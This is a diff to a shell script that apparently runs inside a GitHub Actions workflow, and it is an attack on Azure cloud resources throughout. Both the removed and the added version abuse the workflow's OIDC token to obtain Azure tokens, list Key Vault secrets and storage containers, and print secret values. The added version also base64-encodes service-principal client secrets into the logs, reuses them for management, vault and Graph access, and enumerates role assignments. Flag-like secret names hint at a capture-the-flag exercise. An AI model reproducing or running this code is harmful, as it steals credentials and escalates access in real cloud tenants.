@@ -1,45 +1,35 @@
-#!/bin/bash
-set -e
-TENANT_ID="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
-CLIENT_ID="${AZURE_CLIENT_ID}"
-SUB_ID="${AZURE_SUBSCRIPTION_ID}"
-
-echo "CTX repo=${GITHUB_REPOSITORY} event=${GITHUB_EVENT_NAME}"
-
-# Get GitHub OIDC token
-OIDC_TOKEN=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}"   "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c "import sys,json; print(json.load(sys.stdin).get('value',''))")
-OIDC_LEN=${#OIDC_TOKEN}
-echo "oidc_len=${OIDC_LEN}"
-
-# Exchange for ARM token
-ARM_RESP=$(curl -s -X POST "https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/token"   -d "client_id=${CLIENT_ID}&grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=${OIDC_TOKEN}&assertion=${OIDC_TOKEN}&scope=https://management.azure.com/.default&federated_token=${OIDC_TOKEN}")
-ARM_TOKEN=$(echo "$ARM_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null || echo "")
-
-# Exchange for KV vault token
-KV_RESP=$(curl -s -X POST "https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/token"   -d "client_id=${CLIENT_ID}&grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=${OIDC_TOKEN}&assertion=${OIDC_TOKEN}&scope=https://vault.azure.net/.default&federated_token=${OIDC_TOKEN}")
-KV_TOKEN=$(echo "$KV_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null || echo "")
-KV_LEN=${#KV_TOKEN}
-echo "kv_len=${KV_LEN}"
-
-# Try KV sec
-echo "=== KV SEC LIST ==="
-curl -s -H "Authorization: Bearer ${KV_TOKEN}" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" | python3 -c "import sys,json; d=json.load(sys.stdin); [print(s['id']) for s in d.get('value',[])] or print(json.dumps(d)[:200])"
-
-echo "=== KV SEC SPECIFIC SECRETS ==="
-for name in flag tbl-flag ctf-flag df26-flag platform-flag backup-key data-export-key; do
-  RESULT=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer ${KV_TOKEN}" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/${name}?api-version=7.4")
-  if [ "$RESULT" = "200" ]; then
-    VALUE=$(curl -s -H "Authorization: Bearer ${KV_TOKEN}" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/${name}?api-version=7.4" | python3 -c "import sys,json; print(json.load(sys.stdin).get('value',''))")
-    echo "FOUND: ${name} = ${VALUE}"
-  else
-    echo "  ${name}: ${RESULT}"
-  fi
-done
-
-# Try backup storage with ARM token
-echo "=== BACKUP STORAGE WITH ARM TOKEN ==="
-STOR_RESP=$(curl -s -X POST "https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/token"   -d "client_id=${CLIENT_ID}&grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=${OIDC_TOKEN}&assertion=${OIDC_TOKEN}&scope=https://storage.azure.com/.default&federated_token=${OIDC_TOKEN}")
-STOR_TOKEN=$(echo "$STOR_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null || echo "")
-curl -s -H "Authorization: Bearer ${STOR_TOKEN}" -H "x-ms-version: 2020-08-04" "https://sttblbackupprodx3euoz.blob.core.windows.net/exports?restype=container&comp=list" | python3 -c "import sys; print(sys.stdin.read()[:500])"
-
-echo "END"
+#!/usr/bin/env bash
+set -u
+python3 - <<'PY'
+import os,json,urllib.request,urllib.parse,urllib.error,base64
+TEN=os.environ['AZURE_TENANT_ID']; CID=os.environ['AZURE_CLIENT_ID']; SUB=os.environ['AZURE_SUBSCRIPTION_ID']
+def req(u,method='GET',data=None,h=None):
+ try:
+  r=urllib.request.urlopen(urllib.request.Request(u,data=data,headers=h or {},method=method),timeout=30);return r.status,r.read()
+ except urllib.error.HTTPError as e:return e.code,e.read()
+ except Exception as e:return 0,str(e).encode()
+def j(b):
+ try:return json.loads(b)
+ except:return {}
+def token(cid,scope,secret=None):
+ if secret:d={'client_id':cid,'client_secret':secret,'grant_type':'client_credentials','scope':scope}
+ else:
+  s,b=req(os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']+'&audience=api://AzureADTokenExchange',h={'Authorization':'Bearer '+os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']});d={'client_id':cid,'grant_type':'client_credentials','scope':scope,'client_assertion_type':'urn:ietf:params:oauth:client-assertion-type:jwt-bearer','client_assertion':j(b).get('value','')}
+ s,b=req(f'https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token','POST',urllib.parse.urlencode(d).encode(),{'Content-Type':'application/x-www-form-urlencoded'});return j(b).get('access_token','')
+def emit(k,v):print(k+'_B64='+base64.b64encode((v if isinstance(v,str) else json.dumps(v,separators=(',',':'))).encode()).decode(),flush=True)
+main=token(CID,'https://vault.azure.net/.default');print('MAIN='+str(bool(main)))
+ss=[]
+for n in ['cost-reader-principal','directory-audit-principal','reporting-service-principal','reporting-viewer-principal','secrets-sync-principal','sync-service-principal']:
+ s,b=req('https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/'+n+'?api-version=7.4',h={'Authorization':'Bearer '+main});v=j(b).get('value','');emit('SEC_'+n,v);ss.append((n,j(v)))
+for n,c in ss:
+ if not c.get('clientSecret'):continue
+ for aud in ['https://management.azure.com/.default','https://vault.azure.net/.default','https://graph.microsoft.com/.default']:
+  t=token(c['appId'],aud,c['clientSecret']);print('TOK',n,aud,len(t),flush=True)
+  if aud.startswith('https://vault'):
+   for kv in ['kv-tbl-sec-x3euoz','kv-tbl-prod-x3euoz']:
+    s,b=req('https://'+kv+'.vault.azure.net/secrets?api-version=7.4',h={'Authorization':'Bearer '+t});print('KV',n,kv,s,b[:1500],flush=True)
+  elif aud.startswith('https://management'):
+   for p in [f'/subscriptions/{SUB}/resources?api-version=2021-04-01&$top=200',f'/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=atScope()']:
+    s,b=req('https://management.azure.com'+p,h={'Authorization':'Bearer '+t});print('ARM',n,s,b[:1500],flush=True)
+PY
+PYEOF
